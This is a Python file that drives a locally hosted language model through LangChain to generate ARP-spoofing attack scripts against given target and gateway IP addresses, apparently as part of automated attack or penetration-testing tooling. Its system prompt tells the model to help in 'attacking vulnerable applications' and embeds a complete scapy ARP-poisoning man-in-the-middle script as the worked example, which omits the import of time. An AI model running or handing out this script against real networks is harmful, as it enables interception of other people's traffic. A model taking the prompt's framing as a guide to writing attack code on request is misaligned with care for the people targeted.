# default_prompt = """"
# You are an intelligent assistant experienced in Python programming.
# Always answer as helpfully as possible in attacking vulnerable applications.
# If a question does not make any sense, or is not factually coherent, explain why instead of 
# answering something not correct. If you don't know the answer to a question,
# please don't share false information.
# """

generate_attack_sys = """
You are an intelligent assistant experienced in Python programming.
Always answer as helpfully as possible in attacking vulnerable applications.
If a question does not make any sense, or is not factually coherent, explain why instead of 
answering something not correct. If you don't know the answer to a question,
please don't share false information.

Steps:

Make a function spoof_ip(target_ip, spoof_ip): This function creates an ARP packet with the specified target IP and spoofed IP. 

Make a function get_mac(ip): This function sends an ARP request to obtain the MAC address associated with the given IP. 

Make a function restore(destination_ip, source_ip): This function restores the original MAC addresses of the destination and source IPs. 

Make a variable sent_packets_count: This variable keeps track of the number of spoofed packets sent.

The script starts by setting the target IP and gateway IP addresses. It then enters a loop where it continuously sends spoofed ARP packets to the target and gateway. The packets are sent every 2 seconds using time.sleep(2).

The script handles keyboard interrupts using except KeyboardInterrupt. When a keyboard interrupt is detected (i.e., CTRL+C is pressed), it restores the original MAC addresses of the target and gateway using the restore function and exits the loop.

Note: Use the Python for generating scripts. Avoid assertion errors.

Example:
Do an IP Spoofing attack using Python on target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"
```
import scapy.all as scapy

def spoof_ip(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Example usage
target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof_ip(target_ip, gateway_ip)
        spoof_ip(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Resetting ARP tables... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
```
Take a deep breath and think step by step then do the task.
"""

# Default user/human prompt for generating test cases
generate_attack_human = "Generate a python script for doing an ip spoofing attack. The target ip is {target_ip} and gateway ip is {gateway_ip}"

from langchain_core.prompts import PromptTemplate
from langchain_openai import OpenAI
from langchain.schema import SystemMessage
from langchain.prompts import ChatPromptTemplate
import re
import os
import logging 
import sys

llm = OpenAI(base_url="http://localhost:1234/v1", api_key="lm-studio")


def generate_attack_vector(target_ip, gateway_ip):
    # logging.info("Generating attack vector script for the provided input...")
    #print("Here is our attack name ", attack_name)
    # try:

    sys_message = generate_attack_sys
    human_message = generate_attack_human

    prompt = ChatPromptTemplate.from_messages(
    [
        ("system", sys_message),
        ("human", human_message),
    ]
    )
    chain = prompt | llm
    # input_variables = {'target_ip': target_ip, 'gateway_ip': gateway_ip}
    out = chain.invoke({'target_ip': target_ip, 'gateway_ip': gateway_ip})

    
    #Extract the generated test cases from the output
    result = out.content
    print(result)

    #     #Log successful test case generation
    #     logging.info("Attack vector script have been generated successfully")
        
    #     #Find the start and end index of the generated test cases
    #     start_index = test_cases.find("```python") + len("```python")
    #     end_index = test_cases.find("```", start_index)
        
    #     #Apply filters to extract only the generated test cases
    #     filtered_test_cases = test_cases[start_index:end_index].strip()
    #     print("The generated python script is:\n", filtered_test_cases)

    #     #Name and path for the test cases file
    #     test_cases_name = f"test_ip"
    #     test_file_name = f"test_ip.py"
    #     test_file_path = os.path.join("results", test_file_name)

    #     #Write the filtered test cases to the file
    #     with open(test_file_path, "w") as test_file:
    #         test_file.write(filtered_test_cases)

    #     #Logging successful test case saving
    #     logging.info("Execution in progress...")
    #     print(f"The script has been saved to {test_file_path}")

    #     print("Application name is: ", test_cases_name)
    #     print("Attack script file name is: ", test_file_name)

    #     #Return the filtered test cases and the test file name
    #     return filtered_test_cases, test_cases_name, test_file_name

    # except Exception as e:
    #     #Log any errors encountered during test case generation
    #     logging.error(f"Error in generating the attack script: {str(e)}")
    #     raise

target_ip = "192.168.1.10"
gateway_ip = "192.168.1.1"


generate_attack_vector(target_ip, gateway_ip)

# def main():
#     try:
#         target_ip = "192.168.1.10"
#         gateway_ip = "192.168.1.1"

#         generate_attack_vector(target_ip, gateway_ip)
        


#     except Exception as e:
#         logging.error(f"An error occurred: {str(e)}")
#         sys.exit(1)

# if __name__ == "__main__":
#     main()
